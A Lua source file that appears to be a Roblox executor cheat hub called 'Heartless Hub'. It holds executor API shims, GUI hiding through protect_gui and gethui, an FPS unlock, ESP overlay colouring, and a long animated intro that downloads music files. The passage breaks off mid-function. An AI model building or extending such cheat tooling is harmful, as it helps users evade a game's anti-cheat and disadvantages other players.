Players = game:GetService("Players")
TweenService = game:GetService("TweenService")
UIS = game:GetService("UserInputService")
RunService = game:GetService("RunService")
Lighting = game:GetService("Lighting")
HS = game:GetService("HttpService")
player = Players.LocalPlayer
CONFIG_FILE = "Heartless_Hub_Config.json"

-- Universal executor shims
local function _pickFn(...)
    for i = 1, select("#", ...) do
        local f = select(i, ...)
        if type(f) == "function" then return f end
    end
    return nil
end

local _isfile = _pickFn(
    rawget(getfenv and getfenv() or {}, "isfile"),
    type(isfile) == "function" and isfile or nil,
    syn and syn.isfile,
    getgenv and getgenv().isfile
) or function() return false end

local _readfile = _pickFn(
    type(readfile) == "function" and readfile or nil,
    syn and syn.readfile,
    getgenv and getgenv().readfile
) or function() return nil end

local _writefile = _pickFn(
    type(writefile) == "function" and writefile or nil,
    syn and syn.writefile,
    getgenv and getgenv().writefile
) or function() end

local _delfile = _pickFn(
    type(delfile) == "function" and delfile or nil,
    syn and syn.delfile,
    getgenv and getgenv().delfile
)

local _getcustomasset = _pickFn(
    type(getcustomasset) == "function" and getcustomasset or nil,
    type(getsynasset) == "function" and getsynasset or nil,
    syn and syn.getcustomasset,
    getgenv and getgenv().getcustomasset
)

local _gethui = _pickFn(
    type(gethui) == "function" and gethui or nil,
    getgenv and getgenv().gethui
)

local function safeHttpGet(url)
    local body
    pcall(function()
        if type(game.HttpGet) == "function" then
            body = game:HttpGet(url)
        end
    end)
    if type(body) == "string" and #body > 0 then return body end
    local req = _pickFn(
        type(request) == "function" and request or nil,
        type(http_request) == "function" and http_request or nil,
        http and type(http.request) == "function" and http.request or nil,
        syn and type(syn.request) == "function" and syn.request or nil,
        fluxus and type(fluxus.request) == "function" and fluxus.request or nil
    )
    if req then
        local ok, resp = pcall(function()
            return req({Url = url, Method = "GET"})
        end)
        if ok and type(resp) == "table" then
            return resp.Body or resp.body
        elseif ok and type(resp) == "string" then
            return resp
        end
    end
    return nil
end

if type(getconnections) ~= "function" then
    getconnections = function() return {} end
end

if type(hookfunction) ~= "function" then hookfunction = nil end
if type(newcclosure) ~= "function" then newcclosure = nil end
if type(sethiddenproperty) ~= "function" then sethiddenproperty = nil end

local function protectGui(gui)
    pcall(function()
        if syn and syn.protect_gui then syn.protect_gui(gui) end
    end)
    pcall(function()
        if protect_gui then protect_gui(gui) end
    end)
    pcall(function()
        if type(gethui) == "function" then gui.Parent = gethui() end
    end)
    pcall(function()
        if _gethui then gui.Parent = _gethui() end
    end)
    if not gui.Parent then
        pcall(function()
            local pg = player:FindFirstChild("PlayerGui") or player:WaitForChild("PlayerGui", 5)
            if pg then gui.Parent = pg end
        end)
    end
end

local function parentGui(gui)
    if not gui then return false end
    -- protect first when available
    pcall(function()
        if syn and syn.protect_gui then syn.protect_gui(gui) end
    end)
    pcall(function()
        if protect_gui then protect_gui(gui) end
    end)
    local tries = {}
    pcall(function()
        if type(gethui) == "function" then
            local h = gethui()
            if h then table.insert(tries, h) end
        end
    end)
    pcall(function()
        if _gethui then
            local h = _gethui()
            if h then table.insert(tries, h) end
        end
    end)
    pcall(function()
        if type(get_hidden_gui) == "function" then
            local h = get_hidden_gui()
            if h then table.insert(tries, h) end
        end
    end)
    pcall(function() table.insert(tries, game:GetService("CoreGui")) end)
    pcall(function()
        local pg = player:FindFirstChild("PlayerGui") or player:WaitForChild("PlayerGui", 5)
        if pg then table.insert(tries, pg) end
    end)
    for _, root in ipairs(tries) do
        if gui.Parent then break end
        pcall(function()
            if root then gui.Parent = root end
        end)
    end
    if not gui.Parent then
        pcall(function() gui.Parent = player:WaitForChild("PlayerGui", 10) end)
    end
    return gui.Parent ~= nil
end
-- expose for any late modules / re-exec
pcall(function()
    if getgenv then
        getgenv().parentGui = parentGui
        getgenv().gethui = gethui or _gethui
    end
end)

isfile = _isfile
readfile = _readfile
writefile = _writefile
if _delfile and type(delfile) ~= "function" then delfile = _delfile end
if _getcustomasset then
    getcustomasset = _getcustomasset
    if type(getsynasset) ~= "function" then getsynasset = _getcustomasset end
end
if _gethui and type(gethui) ~= "function" then gethui = _gethui end
HttpGet = safeHttpGet

local EXECUTOR_NAME = "unknown"
pcall(function()
    if identifyexecutor then EXECUTOR_NAME = tostring(identifyexecutor())
    elseif getexecutorname then EXECUTOR_NAME = tostring(getexecutorname())
    elseif syn then EXECUTOR_NAME = "Synapse"
    elseif isexecutorclosure then EXECUTOR_NAME = "Xeno/Unknown"
    end
end)
pcall(function() print("[Heartless Hub] Executor:", EXECUTOR_NAME) end)

fpsUnlocked = true
local function unlockFPS(cap)
    cap = tonumber(cap) or 999
    local applied = false
    local tries = {
        function() if type(setfpscap) == "function" then setfpscap(cap); return true end end,
        function() if getgenv and type(getgenv().setfpscap) == "function" then getgenv().setfpscap(cap); return true end end,
        function() if syn and type(syn.setfpscap) == "function" then syn.setfpscap(cap); return true end end,
        function() if type(set_fps_cap) == "function" then set_fps_cap(cap); return true end end,
        function()
            if type(getfflag) == "function" and type(setfflag) == "function" then
                pcall(setfflag, "DFIntTaskSchedulerTargetFps", tostring(cap))
                return true
            end
        end,
        function()
            -- some mobile stacks
            if type(setfps) == "function" then setfps(cap); return true end
        end,
    }
    for _, fn in ipairs(tries) do
        local ok, res = pcall(fn)
        if ok and res then applied = true end
    end
    pcall(function()
        local UserGameSettings = UserSettings():GetService("UserGameSettings")
        if UserGameSettings then
            pcall(function() UserGameSettings.SavedQualityLevel = Enum.SavedQualitySetting.Automatic end)
        end
    end)
    return applied
end
pcall(function()
    if fpsUnlocked then
        local ok = unlockFPS(999)
        pcall(function() print("[Heartless Hub] FPS unlock:", ok and "applied (cap 999)" or "no setfpscap API on this executor") end)
    end
end)

pcall(function()
    if getgenv then
        local g = getgenv()
        g.isfile, g.readfile, g.writefile = isfile, readfile, writefile
        if getcustomasset then g.getcustomasset = getcustomasset end
    end
end)
uiThemeIndex = 1
uiLayoutMode = 1 -- 1=left, 2=dual, 3=corners, 4=premium

UI_THEMES = {
    {name="Blue",   accent=Color3.fromRGB(56,140,255)},
    {name="Red",    accent=Color3.fromRGB(255,55,55)},
    {name="Purple", accent=Color3.fromRGB(160,70,255)},
    {name="Pink",   accent=Color3.fromRGB(255,90,180)},
    {name="Yellow", accent=Color3.fromRGB(255,210,40)},
    {name="White",  accent=Color3.fromRGB(245,245,250)},
    {name="Black",  accent=Color3.fromRGB(30,30,34)},
    {name="Orange", accent=Color3.fromRGB(255,140,40)},
    {name="Green",  accent=Color3.fromRGB(45,210,110)},
    {name="Ocean",  accent=Color3.fromRGB(15,150,210)},
}
ACCENT_COLOR = UI_THEMES[1].accent
_AccentHooks = {}
function registerAccentHook(fn, inst)
    table.insert(_AccentHooks, {fn=fn, inst=inst})
    pcall(fn, ACCENT_COLOR)
end
function fireAccentHooks()
        if trackerEnabled and buildTracker then pcall(buildTracker) end
        if _studioPopupGui and openBatThemesStudio and _studioPopupGui.Name then
            -- keep open studio accents via hooks
        end
    for i = #_AccentHooks, 1, -1 do
        local h = _AccentHooks[i]
        if h.inst and not h.inst.Parent then
            table.remove(_AccentHooks, i)
        else
            pcall(h.fn, ACCENT_COLOR)
        end
    end
end
function accentTextColor3(a)
    a = a or ACCENT_COLOR
    local lum = 0.299*a.R + 0.587*a.G + 0.114*a.B
    return lum > 0.6 and Color3.fromRGB(15,15,15) or Color3.fromRGB(255,255,255)
end

function refreshESPColors()
    local a = Color3.fromRGB(55, 55, 60)
    local outline = Color3.fromRGB(12, 12, 14)
    for _, entry in pairs(espEntries or {}) do
        if entry.highlight then
            entry.highlight.OutlineColor = outline
            entry.highlight.FillColor = a
        end
        if entry.line and entry.line.Color then
            entry.line.Color = outline
        end
        if entry.speedLabel then
            entry.speedLabel.TextColor3 = Color3.fromRGB(160, 160, 165)
        end
        if entry.nameStroke then
            entry.nameStroke.Color = outline
        end
        if entry.ownerLabel then
            entry.ownerLabel.TextColor3 = Color3.fromRGB(140, 140, 145)
        end
        if entry.ownerStroke then
            entry.ownerStroke.Color = outline
        end
    end
end

introSoundEnabled = true
introEnabled = true
selectedIntroMusic = 1 -- index into 7UP song list
introStyle = 1 -- 1 Letters | 2 Wave Stadium | 3 Orbital | 4 Shatter | 5 Parallax | 6 Neon Grid
medusaResetEnabled = false -- removed
resetOnDieEnabled = false -- removed
_configFullyLoaded = true -- allow saveConfig; values already applied from disk when present
if isfile and isfile(CONFIG_FILE) then
    ok, data = pcall(function() return HS:JSONDecode(readfile(CONFIG_FILE)) end)
    if ok and type(data) == "table" then
        if data.introSoundEnabled ~= nil then
            introSoundEnabled = data.introSoundEnabled
        end
        if data.introEnabled ~= nil then
            introEnabled = data.introEnabled
        end
        if type(data.selectedIntroMusic)=="number" then
            selectedIntroMusic = math.clamp(math.floor(data.selectedIntroMusic), 1, 11)
        end
        if type(data.introStyle)=="number" then
            introStyle = math.clamp(math.floor(data.introStyle), 1, 6)
        end
        if type(data.animEnabled)=="boolean" then animEnabled=data.animEnabled end
        if type(data.uiThemeIndex)=="number" then
            uiThemeIndex = math.clamp(math.floor(data.uiThemeIndex), 1, #UI_THEMES)
            ACCENT_COLOR = UI_THEMES[uiThemeIndex].accent
        end
        if type(data.tpBatDistance)=="number" and data.tpBatDistance > 0 then
            tpBatDistance = data.tpBatDistance
        end
    end
end

INTRO_SOUND_ASSET_ID = "88893843257628"
INTRO_SOUND_DURATION = 5
introSoundId = "88893843257628" -- default; config can override

if isfile and isfile(CONFIG_FILE) then
    local okS, dS = pcall(function() return HS:JSONDecode(readfile(CONFIG_FILE)) end)
    if okS and type(dS)=="table" and type(dS.introSoundId)=="string" and dS.introSoundId ~= "" then
        introSoundId = dS.introSoundId
    end
end
-- Active intro track (user-requested)
introSoundId = "88893843257628"
INTRO_SOUND_ASSET_ID = "rbxassetid://88893843257628"

introSoundInstance = nil
local function playIntroSound()
    local id = tostring(introSoundId or ""):gsub("%s+",""):gsub("rbxassetid://","")
    if id == "" then
        id = tostring(INTRO_SOUND_ASSET_ID or ""):gsub("%s+",""):gsub("rbxassetid://","")
    end
    if id == "" or not tonumber(id) then return end
    if introSoundInstance then pcall(function() introSoundInstance:Stop(); introSoundInstance:Destroy() end) introSoundInstance=nil end
    introSoundInstance = Instance.new("Sound")
    pcall(function()
        introSoundInstance.SoundId = "rbxassetid://" .. id
        introSoundInstance.TimePosition = 0
        introSoundInstance.Volume = 3
        introSoundInstance.Looped = false
        local parented = false
        for _, parentTry in ipairs({
            game:GetService("SoundService"),
            workspace.CurrentCamera,
            player:FindFirstChild("PlayerGui") or player:WaitForChild("PlayerGui", 2),
            workspace,
        }) do
            if parentTry and not parented then
                local ok = pcall(function() introSoundInstance.Parent = parentTry end)
                if ok and introSoundInstance.Parent then parented = true end
            end
        end
        task.spawn(function()
            local s = introSoundInstance
            if not s then return end
            local t0 = tick()
            while s and s.Parent and not s.IsLoaded and (tick()-t0) < 8 do
                task.wait(0.1)
            end
            if s and s.Parent then
                pcall(function() s:Play() end)
            end
            task.delay(INTRO_SOUND_DURATION or 10, function()
                if introSoundInstance and introSoundInstance.Parent then
                    pcall(function() introSoundInstance:Stop() end)
                    pcall(function() introSoundInstance:Destroy() end)
                    introSoundInstance = nil
                end
            end)
        end)
    end)
end
if introSoundEnabled and not introEnabled then
    playIntroSound()
end

_introActive = false
_introSkipRequested = false

local function stopIntroCinematic(force)
    _introSkipRequested = true
    _introActive = false
    pcall(function()
        local pg = player:FindFirstChild("PlayerGui")
        for _, name in ipairs({"OceanHubVSIntro", "OceanCanIntro", "OceanCustomIntro", "ShadowVSIntro", "OceanIntroFX", "gawsbbVSIntro", "K7Intro"}) do
            local g = pg and pg:FindFirstChild(name)
            if g then g:Destroy() end
            pcall(function()
                if gethui then
                    local h = gethui():FindFirstChild(name)
                    if h then h:Destroy() end
                end
            end)
        end
    end)
    if introSoundInstance then
        pcall(function() introSoundInstance:Stop() end)
        pcall(function() introSoundInstance:Destroy() end)
        introSoundInstance = nil
    end
end

if introEnabled then
    task.spawn(function()
        local Players = game:GetService("Players")
        local TweenService = game:GetService("TweenService")
        local SoundService = game:GetService("SoundService")
        local RunService = game:GetService("RunService")
        local player = Players.LocalPlayer
        local PlayerGui = player:WaitForChild("PlayerGui", 10)
        if not PlayerGui then return end

        local ACC = Color3.fromRGB(255, 255, 255) -- B&W intro
        local WHITE = Color3.fromRGB(255, 255, 255)
        local BLACK = Color3.fromRGB(0, 0, 0)

        local INTRO_MUSIC_OPTIONS = {
            {name="Blue Bands", url="https://files.catbox.moe/mzvrir.mp3", file="OceanIntro_1.mp3"},
            {name="Legacy", url="https://files.catbox.moe/siru6c.mp3", file="OceanIntro_2.mp3"},
            {name="paznerknacker.wav", url="https://files.catbox.moe/izcvhm.mp3", file="OceanIntro_3.mp3"},
            {name="Tesla", url="https://files.catbox.moe/n85fch.mp3", file="OceanIntro_4.mp3"},
            {name="King Nasir", url="https://files.catbox.moe/etk99y.mp3", file="OceanIntro_5.mp3"},
            {name="Pure Cocaine", url="https://files.catbox.moe/dvjtjk.mp3", file="OceanIntro_6.mp3"},
            {name="nuts", url="https://files.catbox.moe/iyw1cb.mp3", file="OceanIntro_7.mp3"},
            {name="Gelato", url="https://files.catbox.moe/zf2z42.mp3", file="OceanIntro_8.mp3"},
            {name="FREAKED OUT", url="https://files.catbox.moe/dyt2ja.mp3", file="OceanIntro_9.mp3"},
            {name="Scam Likely", url="https://files.catbox.moe/pr85mz.mp3", file="OceanIntro_10.mp3"},
            {name="NO INTRO MUSIC", silent=true},
        }
        selectedIntroMusic = tonumber(selectedIntroMusic) or 1
        if selectedIntroMusic < 1 or selectedIntroMusic > #INTRO_MUSIC_OPTIONS then selectedIntroMusic = 1 end
        local opt = INTRO_MUSIC_OPTIONS[selectedIntroMusic] or INTRO_MUSIC_OPTIONS[1]
        local MUSIC_SILENT = opt.silent == true
        local MUSIC_URL = opt.url or ""
        local MUSIC_FILE = opt.file or "OceanIntro_Music.mp3"

        for _, name in ipairs({"OceanHubVSIntro", "OceanCanIntro", "OceanCustomIntro", "ShadowVSIntro", "OceanIntroFX", "gawsbbVSIntro", "K7Intro"}) do
            local old = PlayerGui:FindFirstChild(name)
            if old then old:Destroy() end
        end

        _introActive = true
        _introSkipRequested = false
        local active, finished = true, false

        local function tw(o, ti, props, es, ed)
            return TweenService:Create(
                o,
                TweenInfo.new(ti or 0.4, es or Enum.EasingStyle.Quint, ed or Enum.EasingDirection.Out),
                props
            )
        end
        local function playTw(o, ti, props, es, ed)
            local twn = tw(o, ti, props, es, ed)
            twn:Play()
            return twn
        end
        local function aliveWait(s)
            local e = 0
            while active and not _introSkipRequested and e < s do
                e = e + task.wait(math.min(0.03, s - e))
            end
            return active and not _introSkipRequested
        end

        local gui = Instance.new("ScreenGui")
        gui.Name = "OceanCustomIntro"
        gui.IgnoreGuiInset = true
        gui.ResetOnSpawn = false
        gui.DisplayOrder = 999999
        gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        parentGui(gui)

        -- Accent full-screen bg
        local bg = Instance.new("Frame", gui)
        bg.Size = UDim2.fromScale(1, 1)
        bg.BackgroundColor3 = BLACK
        bg.BackgroundTransparency = 1
        bg.BorderSizePixel = 0
        bg.ZIndex = 1
        bg.ClipsDescendants = true

        local veil = Instance.new("Frame", bg)
        veil.Size = UDim2.fromScale(1, 1)
        veil.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        veil.BackgroundTransparency = 0.5
        veil.BorderSizePixel = 0
        veil.ZIndex = 2

        local orbs = {}
        for i = 1, 6 do
            local o = Instance.new("Frame", bg)
            o.AnchorPoint = Vector2.new(0.5, 0.5)
            o.Position = UDim2.fromScale(0.15 + (i % 3) * 0.35, 0.2 + math.floor((i - 1) / 3) * 0.45)
            o.Size = UDim2.fromOffset(0, 0)
            o.BackgroundColor3 = WHITE
            o.BackgroundTransparency = 0.9
            o.BorderSizePixel = 0
            o.ZIndex = 3
            Instance.new("UICorner", o).CornerRadius = UDim.new(1, 0)
            orbs[i] = o
        end

        -- Letter stage
        local stage = Instance.new("Frame", bg)
        stage.AnchorPoint = Vector2.new(0.5, 0.5)
        stage.Position = UDim2.fromScale(0.5, 0.42)
        stage.Size = UDim2.fromOffset(520, 120)
        stage.BackgroundTransparency = 1
        stage.ZIndex = 20

        local function makeLetter(ch, finalX, fromDir)
            local lbl = Instance.new("TextLabel", stage)
            lbl.BackgroundTransparency = 1
            lbl.Size = UDim2.fromOffset(42, 72)
            lbl.AnchorPoint = Vector2.new(0.5, 0.5)
            lbl.Text = ch
            lbl.TextColor3 = WHITE
            lbl.TextTransparency = 1
            lbl.Font = Enum.Font.GothamBlack
            lbl.TextSize = 48
            lbl.ZIndex = 21
            local off = 140
            if fromDir == "up" then
                lbl.Position = UDim2.new(0, finalX, 0.5, -off)
            elseif fromDir == "down" then
                lbl.Position = UDim2.new(0, finalX, 0.5, off)
            elseif fromDir == "left" then
                lbl.Position = UDim2.new(0, finalX - off, 0.5, 0)
            else
                lbl.Position = UDim2.new(0, finalX + off, 0.5, 0)
            end
            return lbl
        end

        -- "Heartless Hub" — directions alternate
        local word1 = {"O", "C", "E", "A", "N"}
        local word2 = {"H", "U", "B"}
        local dirs = {"up", "left", "down", "right", "up", "right", "down", "left"}
        local letters = {}
        local startX1 = 70
        for i, ch in ipairs(word1) do
            letters[#letters + 1] = makeLetter(ch, startX1 + (i - 1) * 44, dirs[i])
        end
        local startX2 = 320
        for i, ch in ipairs(word2) do
            letters[#letters + 1] = makeLetter(ch, startX2 + (i - 1) * 44, dirs[5 + i])
        end

        local sub = Instance.new("TextLabel", bg)
        sub.AnchorPoint = Vector2.new(0.5, 0.5)
        sub.Position = UDim2.fromScale(0.5, 0.58)
        sub.Size = UDim2.new(0, 400, 0, 28)
        sub.BackgroundTransparency = 1
        sub.Text = "D  U  E  L  S"
        sub.TextColor3 = WHITE
        sub.TextTransparency = 1
        sub.Font = Enum.Font.GothamBold
        sub.TextSize = 16
        sub.ZIndex = 22

        local tag = Instance.new("TextLabel", bg)
        tag.AnchorPoint = Vector2.new(0.5, 0.5)
        tag.Position = UDim2.fromScale(0.5, 0.64)
        tag.Size = UDim2.new(0, 420, 0, 20)
        tag.BackgroundTransparency = 1
        tag.Text = "READY"
        tag.TextColor3 = WHITE
        tag.TextTransparency = 1
        tag.Font = Enum.Font.GothamBlack
        tag.TextSize = 12
        tag.ZIndex = 22

        local barBg = Instance.new("Frame", bg)
        barBg.AnchorPoint = Vector2.new(0.5, 0.5)
        barBg.Position = UDim2.fromScale(0.5, 0.72)
        barBg.Size = UDim2.fromOffset(220, 3)
        barBg.BackgroundColor3 = WHITE
        barBg.BackgroundTransparency = 0.85
        barBg.BorderSizePixel = 0
        barBg.ZIndex = 22
        Instance.new("UICorner", barBg).CornerRadius = UDim.new(1, 0)
        local barFill = Instance.new("Frame", barBg)
        barFill.Size = UDim2.new(0, 0, 1, 0)
        barFill.BackgroundColor3 = WHITE
        barFill.BackgroundTransparency = 0.1
        barFill.BorderSizePixel = 0
        barFill.ZIndex = 23
        Instance.new("UICorner", barFill).CornerRadius = UDim.new(1, 0)

        -- SKIP INTRO
        local skip = Instance.new("TextButton", gui)
        skip.AnchorPoint = Vector2.new(1, 0)
        skip.Position = UDim2.new(1, -16, 0, 16)
        skip.Size = UDim2.fromOffset(118, 36)
        skip.BackgroundColor3 = Color3.fromRGB(8, 10, 14)
        skip.BackgroundTransparency = 0.2
        skip.BorderSizePixel = 0
        skip.Text = "SKIP INTRO"
        skip.TextColor3 = WHITE
        skip.TextSize = 12
        skip.Font = Enum.Font.GothamBlack
        skip.AutoButtonColor = false
        skip.ZIndex = 500
        Instance.new("UICorner", skip).CornerRadius = UDim.new(0, 8)
        local skipSt = Instance.new("UIStroke", skip)
        skipSt.Color = WHITE
        skipSt.Transparency = 0.5
        skipSt.Thickness = 1

        local introSound = nil
        local function playMusic()
            if MUSIC_SILENT or MUSIC_URL == "" then return end
            local asset
            pcall(function()
                if isfile and isfile(MUSIC_FILE) and getcustomasset then
                    asset = getcustomasset(MUSIC_FILE)
                end
            end)
            if not asset then
                local data
                pcall(function()
                    if HttpGet then data = HttpGet(MUSIC_URL)
                    elseif game.HttpGet then data = game:HttpGet(MUSIC_URL) end
                end)
                if type(data) == "string" and #data > 100 and writefile then
                    pcall(function() writefile(MUSIC_FILE, data) end)
                    pcall(function() if getcustomasset then asset = getcustomasset(MUSIC_FILE) end end)
                end
            end
            if not asset then return end
            introSound = Instance.new("Sound")
            introSound.Volume = 0.75
            introSound.Looped = false
            introSound.SoundId = asset
            introSound.Parent = SoundService
            pcall(function() introSound:Play() end)
            introSoundInstance = introSound
        end

        local function finishIntro()
            if finished then return end
            finished = true
            active = false
            _introActive = false
            _introSkipRequested = true
            pcall(function()
                if introSound then introSound:Stop(); introSound:Destroy() end
            end)
            introSoundInstance = nil
            playTw(bg, 0.4, {BackgroundTransparency = 1})
            for _, L in ipairs(letters) do
                playTw(L, 0.25, {TextTransparency = 1})
            end
            playTw(sub, 0.25, {TextTransparency = 1})
            playTw(tag, 0.25, {TextTransparency = 1})
            task.delay(0.45, function()
                pcall(function() if gui then gui:Destroy() end end)
            end)
        end

        skip.MouseButton1Click:Connect(finishIntro)
        pcall(function() skip.Activated:Connect(finishIntro) end)

        task.spawn(function()
            playMusic()
            local style = math.clamp(tonumber(introStyle) or 1, 1, 6)

            if style == 2 then
                -- WAVE STADIUM (upgraded)
                playTw(bg, 0.5, {BackgroundTransparency = 0})
                local bgImg = Instance.new("ImageLabel", bg)
                bgImg.Size = UDim2.fromScale(1,1)
                bgImg.BackgroundTransparency = 1
                bgImg.Image = ""
                bgImg.ImageTransparency = 0.55
                bgImg.ScaleType = Enum.ScaleType.Crop
                bgImg.ZIndex = 1
                local bars = {}
                for i = 1, 24 do
                    local b = Instance.new("Frame", bg)
                    b.AnchorPoint = Vector2.new(0.5, 1)
                    b.Position = UDim2.fromScale(0.04 + (i - 1) * 0.04, 0.78)
                    b.Size = UDim2.fromOffset(10, 12)
                    b.BackgroundColor3 = WHITE
                    b.BackgroundTransparency = 0.05
                    b.BorderSizePixel = 0
                    b.ZIndex = 15
                    Instance.new("UICorner", b).CornerRadius = UDim.new(1, 0)
                    local st = Instance.new("UIStroke", b)
                    st.Color = ACC
                    st.Thickness = 1.2
                    st.Transparency = 0.35
                    bars[i] = b
                end
                local logoWrap = Instance.new("Frame", bg)
                logoWrap.AnchorPoint = Vector2.new(0.5, 0.5)
                logoWrap.Position = UDim2.fromScale(0.5, 0.36)
                logoWrap.Size = UDim2.fromOffset(0, 0)
                logoWrap.BackgroundColor3 = ACC
                logoWrap.BackgroundTransparency = 0.2
                logoWrap.BorderSizePixel = 0
                logoWrap.ZIndex = 20
                Instance.new("UICorner", logoWrap).CornerRadius = UDim.new(0, 18)
                local logoImg = Instance.new("ImageLabel", logoWrap)
                logoImg.Size = UDim2.fromScale(1,1)
                logoImg.BackgroundTransparency = 1
                logoImg.Image = ""
                logoImg.ScaleType = Enum.ScaleType.Crop
                logoImg.ImageTransparency = 0.35
                Instance.new("UICorner", logoImg).CornerRadius = UDim.new(0, 18)
                local logoTxt = Instance.new("TextLabel", logoWrap)
                logoTxt.Size = UDim2.fromScale(1,1)
                logoTxt.BackgroundTransparency = 1
                logoTxt.Text = "Heartless Hub"
                logoTxt.Font = Enum.Font.GothamBlack
                logoTxt.TextSize = 28
                logoTxt.TextColor3 = WHITE
                logoTxt.ZIndex = 22
                playTw(logoWrap, 0.7, {Size = UDim2.fromOffset(160, 160)}, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
                local big = Instance.new("TextLabel", bg)
                big.AnchorPoint = Vector2.new(0.5, 0.5)
                big.Position = UDim2.fromScale(0.5, 0.58)
                big.Size = UDim2.new(0.9, 0, 0, 60)
                big.BackgroundTransparency = 1
                big.Text = "Heartless Hub"
                big.TextColor3 = WHITE
                big.TextTransparency = 1
                big.Font = Enum.Font.GothamBlack
                big.TextSize = 42
                big.ZIndex = 20
                playTw(big, 0.7, {TextTransparency = 0}, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
                local subW = Instance.new("TextLabel", bg)
                subW.AnchorPoint = Vector2.new(0.5, 0.5)
                subW.Position = UDim2.fromScale(0.5, 0.68)
                subW.Size = UDim2.new(0.8, 0, 0, 24)
                subW.BackgroundTransparency = 1
                subW.Text = "D U E L S  ·  WAVE STADIUM"
                subW.TextColor3 = WHITE
                subW.TextTransparency = 1
                subW.Font = Enum.Font.GothamBold
                subW.TextSize = 14
                subW.ZIndex = 20
                playTw(subW, 0.6, {TextTransparency = 0.1})
                local t0 = tick()
                while active and not _introSkipRequested and (tick() - t0) < 7.2 do
                    local t = tick() - t0
                    for i, b in ipairs(bars) do
                        local h = 18 + math.abs(math.sin(t * 3.6 + i * 0.42)) * 110 + math.abs(math.sin(t * 1.7 + i * 0.9)) * 40
                        b.Size = UDim2.fromOffset(10, h)
                    end
                    task.wait(0.03)
                end
                playTw(big, 0.4, {TextTransparency = 1})
                playTw(subW, 0.35, {TextTransparency = 1})
                playTw(logoWrap, 0.4, {Size = UDim2.fromOffset(0,0), BackgroundTransparency = 1})
                playTw(veil, 0.45, {BackgroundTransparency = 0})
                if not aliveWait(0.5) then finishIntro(); return end
                finishIntro()
                return
            elseif style == 3 then
                playTw(bg, 0.25, {BackgroundTransparency = 0})
                bg.BackgroundColor3 = Color3.fromRGB(4, 6, 12)
                local left = Instance.new("Frame", bg)
                left.Size = UDim2.fromScale(0.5, 1)
                left.Position = UDim2.fromScale(-0.5, 0)
                left.BackgroundColor3 = ACC
                left.BorderSizePixel = 0
                left.ZIndex = 5
                local right = Instance.new("Frame", bg)
                right.Size = UDim2.fromScale(0.5, 1)
                right.Position = UDim2.fromScale(1, 0)
                right.BackgroundColor3 = Color3.fromRGB(8, 12, 22)
                right.BorderSizePixel = 0
                right.ZIndex = 5
                local midLine = Instance.new("Frame", bg)
                midLine.AnchorPoint = Vector2.new(0.5, 0.5)
                midLine.Position = UDim2.fromScale(0.5, 0.5)
                midLine.Size = UDim2.fromOffset(0, 0)
                midLine.BackgroundColor3 = WHITE
                midLine.BorderSizePixel = 0
                midLine.ZIndex = 8
                playTw(left, 0.7, {Position = UDim2.fromScale(0, 0)}, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
                playTw(right, 0.7, {Position = UDim2.fromScale(0.5, 0)}, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
                if not aliveWait(0.55) then finishIntro(); return end
                playTw(midLine, 0.45, {Size = UDim2.fromOffset(4, 280)}, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
                local title3 = Instance.new("TextLabel", bg)
                title3.AnchorPoint = Vector2.new(0.5, 0.5)
                title3.Position = UDim2.fromScale(0.5, 0.42)
                title3.Size = UDim2.new(0.9, 0, 0, 70)
                title3.BackgroundTransparency = 1
                title3.Text = "Heartless Hub"
                title3.TextColor3 = WHITE
                title3.TextTransparency = 1
                title3.Font = Enum.Font.GothamBlack
                title3.TextSize = 58
                title3.ZIndex = 20
                local title3b = title3:Clone()
                title3b.Parent = bg
                title3b.Position = UDim2.fromScale(0.5, 0.54)
                title3b.Text = ""
                title3b.TextSize = 42
                title3b.TextColor3 = WHITE
                playTw(title3, 0.5, {TextTransparency = 0}, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
                playTw(title3b, 0.5, {TextTransparency = 0}, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
                local tag3 = Instance.new("TextLabel", bg)
                tag3.AnchorPoint = Vector2.new(0.5, 0.5)
                tag3.Position = UDim2.fromScale(0.5, 0.72)
                tag3.Size = UDim2.new(0.8, 0, 0, 22)
                tag3.BackgroundTransparency = 1
                tag3.Text = "HORIZON  ·  SPLIT"
                tag3.TextColor3 = WHITE
                tag3.TextTransparency = 1
                tag3.Font = Enum.Font.GothamBold
                tag3.TextSize = 13
                tag3.ZIndex = 20
                playTw(tag3, 0.4, {TextTransparency = 0.15})
                if not aliveWait(4.2) then finishIntro(); return end
                playTw(left, 0.55, {Position = UDim2.fromScale(-0.55, 0)})
                playTw(right, 0.55, {Position = UDim2.fromScale(1.05, 0)})
                playTw(title3, 0.3, {TextTransparency = 1})
                playTw(title3b, 0.3, {TextTransparency = 1})
                playTw(tag3, 0.3, {TextTransparency = 1})
                playTw(midLine, 0.3, {Size = UDim2.fromOffset(0, 0)})
                if not aliveWait(0.55) then finishIntro(); return end
                finishIntro()
                return

            elseif style == 4 then
                bg.BackgroundColor3 = Color3.fromRGB(2, 8, 4)
                playTw(bg, 0.3, {BackgroundTransparency = 0})
                -- rain columns
                local rain = {}
                for i = 1, 18 do
                    local col = Instance.new("TextLabel", bg)
                    col.Size = UDim2.new(0, 18, 1, 0)
                    col.Position = UDim2.fromScale((i - 1) / 18, -0.2 - math.random() * 0.3)
                    col.BackgroundTransparency = 1
                    col.Text = "01\n10\n11\n00\n01\n10\n11\n01"
                    col.TextColor3 = ACC
                    col.TextTransparency = 0.55
                    col.Font = Enum.Font.Code
                    col.TextSize = 11
                    col.TextYAlignment = Enum.TextYAlignment.Top
                    col.ZIndex = 4
                    rain[i] = col
                    playTw(col, 2.5 + math.random() * 1.5, {
                        Position = UDim2.fromScale((i - 1) / 18, 1.1),
                    }, Enum.EasingStyle.Linear, Enum.EasingDirection.In)
                end
                local glitch = Instance.new("TextLabel", bg)
                glitch.AnchorPoint = Vector2.new(0.5, 0.5)
                glitch.Position = UDim2.fromScale(0.5, 0.45)
                glitch.Size = UDim2.new(0.95, 0, 0, 70)
                glitch.BackgroundTransparency = 1
                glitch.Text = ""
                glitch.TextColor3 = WHITE
                glitch.Font = Enum.Font.GothamBlack
                glitch.TextSize = 48
                glitch.ZIndex = 25
                local full = "Heartless Hub"
